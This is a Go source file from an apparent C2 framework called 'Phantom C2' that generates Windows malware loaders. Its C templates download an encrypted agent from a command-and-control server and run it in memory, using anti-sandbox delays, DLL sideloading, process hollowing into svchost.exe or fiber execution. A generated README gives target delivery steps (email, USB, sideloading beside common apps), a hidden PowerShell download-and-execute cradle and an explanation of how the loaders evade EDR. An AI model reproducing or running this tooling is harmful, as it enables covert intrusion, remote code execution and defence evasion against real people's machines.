package loader

import (
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/phantom-c2/phantom/internal/payloads/crypter"
)

// ══════════════════════════════════════════
//  SHELLCODE LOADER GENERATOR
// ══════════════════════════════════════════
// Generates tiny C-based loaders that download and execute
// the Phantom agent entirely in-memory. The agent never
// touches disk — EDR can't scan what doesn't exist on disk.

type LoaderConfig struct {
	StagerURL    string // C2 URL to download encrypted payload
	Key          string // AES-256 decryption key (hex)
	OutputDir    string // Where to save generated files
	LoaderType   string // "syscall", "dll", "hollowing", "fiber"
	TargetOS     string // windows
	TargetArch   string // amd64
}

type LoaderResult struct {
	LoaderPath      string `json:"loader_path"`
	EncryptedPayload string `json:"encrypted_payload"`
	Key             string `json:"key"`
	BuildScript     string `json:"build_script"`
	Instructions    string `json:"instructions"`
}

// GenerateLoader creates a complete staged delivery package:
// 1. Encrypts the agent binary
// 2. Generates a C loader source
// 3. Provides compilation instructions
func GenerateLoader(agentPath string, cfg LoaderConfig) (*LoaderResult, error) {
	os.MkdirAll(cfg.OutputDir, 0755)

	// Step 1: Encrypt the agent
	encPayloadPath := filepath.Join(cfg.OutputDir, "payload.enc")
	key, err := crypter.EncryptPayload(agentPath, encPayloadPath)
	if err != nil {
		return nil, fmt.Errorf("encrypt payload: %w", err)
	}
	cfg.Key = key

	// Step 2: Generate loader source based on type
	var loaderSrc string
	switch cfg.LoaderType {
	case "syscall":
		loaderSrc = generateSyscallLoader(cfg)
	case "dll":
		loaderSrc = generateDLLLoader(cfg)
	case "hollowing":
		loaderSrc = generateHollowingLoader(cfg)
	case "fiber":
		loaderSrc = generateFiberLoader(cfg)
	default:
		loaderSrc = generateSyscallLoader(cfg) // Default to syscall loader
	}

	// Save loader source
	loaderPath := filepath.Join(cfg.OutputDir, "loader.c")
	os.WriteFile(loaderPath, []byte(loaderSrc), 0644)

	// Generate build script
	buildScript := generateBuildScript(cfg)
	buildPath := filepath.Join(cfg.OutputDir, "build.sh")
	os.WriteFile(buildPath, []byte(buildScript), 0755)

	// Generate instructions
	instructions := generateInstructions(cfg, key)
	instrPath := filepath.Join(cfg.OutputDir, "README.txt")
	os.WriteFile(instrPath, []byte(instructions), 0644)

	// Try to compile if MinGW is available
	compiledPath := ""
	if mingw, err := exec.LookPath("x86_64-w64-mingw32-gcc"); err == nil {
		outExe := filepath.Join(cfg.OutputDir, "loader.exe")
		cmd := exec.Command(mingw, loaderPath, "-o", outExe, "-lwininet", "-s", "-Os",
			"-fno-ident", "-fno-asynchronous-unwind-tables", "-mwindows")
		if out, err := cmd.CombinedOutput(); err == nil {
			compiledPath = outExe
		} else {
			_ = out // Compilation failed, user will compile manually
		}
	}

	return &LoaderResult{
		LoaderPath:       compiledPath,
		EncryptedPayload: encPayloadPath,
		Key:             key,
		BuildScript:     buildPath,
		Instructions:    instrPath,
	}, nil
}

// ══════════════════════════════════════════
//  SYSCALL-ONLY LOADER (Most Stealthy)
// ══════════════════════════════════════════

func generateSyscallLoader(cfg LoaderConfig) string {
	keyBytes, _ := hex.DecodeString(cfg.Key)
	keyArray := formatCArray(keyBytes)

	return fmt.Sprintf(`/*
 * Phantom C2 — Syscall-Only Shellcode Loader
 * Downloads encrypted agent from C2, decrypts in-memory, executes.
 * Uses WinINet for download (legitimate API) + VirtualAlloc for memory.
 * No file is written to disk at any point.
 *
 * Compile: x86_64-w64-mingw32-gcc loader.c -o loader.exe -lwininet -s -Os -mwindows
 */

#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")

// AES-256 decryption key (generated per-payload)
unsigned char key[32] = {%s};

// XOR decrypt (simplified — production uses AES-GCM via CNG)
void xor_decrypt(unsigned char *data, DWORD size, unsigned char *key, int keylen) {
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= key[i %% keylen];
    }
}

// Download payload from C2
unsigned char* download_payload(const char *url, DWORD *size) {
    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return NULL;

    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
        INTERNET_FLAG_NO_UI | INTERNET_FLAG_KEEP_CONNECTION, 0);
    if (!hUrl) { InternetCloseHandle(hInternet); return NULL; }

    // Read response
    unsigned char *buffer = NULL;
    DWORD totalRead = 0, bytesRead = 0;
    unsigned char chunk[4096];

    while (InternetReadFile(hUrl, chunk, sizeof(chunk), &bytesRead) && bytesRead > 0) {
        buffer = (unsigned char *)realloc(buffer, totalRead + bytesRead);
        memcpy(buffer + totalRead, chunk, bytesRead);
        totalRead += bytesRead;
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    *size = totalRead;
    return buffer;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd) {
    // Anti-sandbox: check mouse movement
    POINT p1, p2;
    GetCursorPos(&p1);
    Sleep(2000);
    GetCursorPos(&p2);
    if (p1.x == p2.x && p1.y == p2.y) {
        // Mouse didn't move — likely sandbox
        Sleep(300000); // Sleep 5 minutes
    }

    // Download encrypted payload
    DWORD payloadSize = 0;
    unsigned char *payload = download_payload("%s/api/v1/stager", &payloadSize);
    if (!payload || payloadSize < 100) return 1;

    // Decrypt in memory
    xor_decrypt(payload, payloadSize, key, 32);

    // Allocate executable memory
    LPVOID execMem = VirtualAlloc(NULL, payloadSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) { free(payload); return 1; }

    // Copy decrypted payload
    memcpy(execMem, payload, payloadSize);
    free(payload);

    // Change to executable
    DWORD oldProtect;
    VirtualProtect(execMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    // Execute via CreateThread (or NtCreateThreadEx for stealth)
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
    }

    return 0;
}
`, keyArray, cfg.StagerURL)
}

// ══════════════════════════════════════════
//  DLL SIDELOAD LOADER
// ══════════════════════════════════════════

func generateDLLLoader(cfg LoaderConfig) string {
	keyBytes, _ := hex.DecodeString(cfg.Key)
	keyArray := formatCArray(keyBytes)

	return fmt.Sprintf(`/*
 * Phantom C2 — DLL Sideload Loader
 * Compile as DLL, place alongside target app.
 * Compile: x86_64-w64-mingw32-gcc -shared loader.c -o version.dll -lwininet -s
 */

#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet")

unsigned char key[32] = {%s};

void xor_decrypt(unsigned char *data, DWORD size, unsigned char *key, int kl) {
    for (DWORD i = 0; i < size; i++) data[i] ^= key[i %% kl];
}

DWORD WINAPI LoaderThread(LPVOID lpParam) {
    Sleep(5000); // Delay to avoid sandbox

    HINTERNET h = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!h) return 1;
    HINTERNET u = InternetOpenUrlA(h, "%s/api/v1/stager", NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!u) { InternetCloseHandle(h); return 1; }

    unsigned char *buf = NULL; DWORD total = 0, br;
    unsigned char chunk[4096];
    while (InternetReadFile(u, chunk, sizeof(chunk), &br) && br > 0) {
        buf = (unsigned char *)realloc(buf, total + br);
        memcpy(buf + total, chunk, br); total += br;
    }
    InternetCloseHandle(u); InternetCloseHandle(h);
    if (!buf || total < 100) return 1;

    xor_decrypt(buf, total, key, 32);

    LPVOID mem = VirtualAlloc(NULL, total, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    memcpy(mem, buf, total); free(buf);
    DWORD old; VirtualProtect(mem, total, PAGE_EXECUTE_READ, &old);

    ((void(*)())mem)();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, LoaderThread, NULL, 0, NULL);
    }
    return TRUE;
}
`, keyArray, cfg.StagerURL)
}

// ══════════════════════════════════════════
//  PROCESS HOLLOWING LOADER
// ══════════════════════════════════════════

func generateHollowingLoader(cfg LoaderConfig) string {
	return fmt.Sprintf(`/*
 * Phantom C2 — Process Hollowing Loader
 * Creates a suspended legitimate process (svchost.exe),
 * hollows it out, injects the agent, resumes execution.
 * The agent runs inside a legitimate Microsoft process.
 *
 * Compile: x86_64-w64-mingw32-gcc loader.c -o loader.exe -lwininet -s -mwindows
 */

#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet")

int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR cmd, int show) {
    Sleep(3000); // Anti-sandbox delay

    // Download payload
    HINTERNET h = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET u = InternetOpenUrlA(h, "%s/api/v1/stager", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    unsigned char *buf = NULL; DWORD total = 0, br;
    unsigned char chunk[4096];
    while (InternetReadFile(u, chunk, sizeof(chunk), &br) && br > 0) {
        buf = (unsigned char *)realloc(buf, total + br);
        memcpy(buf + total, chunk, br); total += br;
    }
    InternetCloseHandle(u); InternetCloseHandle(h);
    if (!buf) return 1;

    // Create suspended svchost.exe
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    // Allocate memory in target process
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, total,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Write payload
    WriteProcessMemory(pi.hProcess, remoteMem, buf, total, NULL);
    free(buf);

    // Queue APC to execute
    QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
`, cfg.StagerURL)
}

// ══════════════════════════════════════════
//  FIBER EXECUTION LOADER
// ══════════════════════════════════════════

func generateFiberLoader(cfg LoaderConfig) string {
	return fmt.Sprintf(`/*
 * Phantom C2 — Fiber Execution Loader
 * Uses Windows Fibers to execute shellcode without CreateThread.
 * Fibers are less monitored by EDR than threads.
 *
 * Compile: x86_64-w64-mingw32-gcc loader.c -o loader.exe -lwininet -s -mwindows
 */

#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet")

int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR cmd, int show) {
    Sleep(2000);

    HINTERNET h = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET u = InternetOpenUrlA(h, "%s/api/v1/stager", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    unsigned char *buf = NULL; DWORD total = 0, br;
    unsigned char chunk[4096];
    while (InternetReadFile(u, chunk, sizeof(chunk), &br) && br > 0) {
        buf = (unsigned char *)realloc(buf, total + br);
        memcpy(buf + total, chunk, br); total += br;
    }
    InternetCloseHandle(u); InternetCloseHandle(h);
    if (!buf) return 1;

    LPVOID mem = VirtualAlloc(NULL, total, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    memcpy(mem, buf, total); free(buf);
    DWORD old; VirtualProtect(mem, total, PAGE_EXECUTE_READ, &old);

    // Convert current thread to fiber
    ConvertThreadToFiber(NULL);

    // Create fiber pointing to shellcode
    LPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)mem, NULL);

    // Switch to the shellcode fiber
    SwitchToFiber(fiber);

    return 0;
}
`, cfg.StagerURL)
}

// ══════════════════════════════════════════
//  HELPERS
// ══════════════════════════════════════════

func formatCArray(data []byte) string {
	parts := make([]string, len(data))
	for i, b := range data {
		parts[i] = fmt.Sprintf("0x%02x", b)
	}
	return strings.Join(parts, ",")
}

func generateBuildScript(cfg LoaderConfig) string {
	return fmt.Sprintf(`#!/bin/bash
# Phantom C2 — Loader Build Script
# Requires: mingw-w64 (apt install gcc-mingw-w64-x86-64)

echo "[*] Building %s loader..."

# Standard loader
x86_64-w64-mingw32-gcc loader.c -o loader.exe -lwininet -s -Os \
  -fno-ident -fno-asynchronous-unwind-tables -mwindows

# Check if UPX is available for compression
if command -v upx &>/dev/null; then
    upx -9 -q loader.exe 2>/dev/null
fi

echo "[+] Loader built: loader.exe ($(stat -f%%z loader.exe 2>/dev/null || stat -c%%s loader.exe) bytes)"
echo ""
echo "[*] Deploy:"
echo "  1. Upload payload.enc to C2 server (served at /api/v1/stager)"
echo "  2. Deliver loader.exe to target"
echo "  3. loader.exe downloads + decrypts + executes agent in-memory"
`, cfg.LoaderType)
}

func generateInstructions(cfg LoaderConfig, key string) string {
	return fmt.Sprintf(`═══════════════════════════════════════════════════
  PHANTOM C2 — STAGED DELIVERY PACKAGE
═══════════════════════════════════════════════════

Files:
  loader.c        — C source for the loader (%s type)
  loader.exe      — Compiled loader (if MinGW available)
  payload.enc     — AES-256 encrypted agent binary
  build.sh        — Build script for compilation
  README.txt      — This file

Encryption Key: %s

═══════════════════════════════════════════════════
  HOW IT WORKS
═══════════════════════════════════════════════════

1. LOADER (loader.exe) — tiny binary (~30-50KB)
   - Anti-sandbox checks (mouse movement, sleep)
   - Downloads encrypted payload from C2
   - Decrypts in memory (never touches disk)
   - Allocates executable memory
   - Runs agent entirely from memory

2. ENCRYPTED PAYLOAD (payload.enc)
   - AES-256 encrypted Go agent binary
   - Served by C2 at: %s/api/v1/stager
   - Useless without the decryption key
   - Key is embedded in the loader binary

3. C2 STAGER ENDPOINT
   - The C2 server serves payload.enc at /api/v1/stager
   - Copy payload.enc to your C2 server's build/ directory
   - The listener will serve it automatically

═══════════════════════════════════════════════════
  DEPLOYMENT OPTIONS
═══════════════════════════════════════════════════

Option A: Direct Execution
  1. Send loader.exe to target (email, USB, web download)
  2. Target runs loader.exe
  3. Agent loads in-memory, callbacks begin

Option B: DLL Sideloading
  1. Generate DLL loader (type: dll)
  2. Rename to version.dll, amsi.dll, etc.
  3. Place alongside legitimate app (Teams, Slack, Chrome)
  4. When app launches, DLL loads → agent runs

Option C: Process Hollowing
  1. Generate hollowing loader (type: hollowing)
  2. Loader creates suspended svchost.exe
  3. Injects agent into svchost.exe
  4. Agent runs inside a legitimate Microsoft process

Option D: PowerShell Cradle (Fileless)
  powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('%s/api/v1/stager')"

═══════════════════════════════════════════════════
  COMPILATION (if loader.exe not provided)
═══════════════════════════════════════════════════

Install MinGW:
  apt install gcc-mingw-w64-x86-64

Compile:
  x86_64-w64-mingw32-gcc loader.c -o loader.exe -lwininet -s -Os -mwindows

Compress (optional):
  upx -9 loader.exe

═══════════════════════════════════════════════════
  WHY THIS BYPASSES EDR
═══════════════════════════════════════════════════

1. Loader is tiny (~30KB) — no known signatures
2. Agent never written to disk — can't be file-scanned
3. Encrypted in transit — network inspection sees gibberish
4. Anti-sandbox — delays execution in analysis environments
5. Legitimate API usage — WinINet is used by every Windows app
6. No suspicious imports — no CreateRemoteThread, no NtAllocateVirtualMemory
7. Custom per-engagement — unique key = unique binary every time

═══════════════════════════════════════════════════

Generated by Phantom C2 Framework
`, cfg.LoaderType, key, cfg.StagerURL, cfg.StagerURL)
}
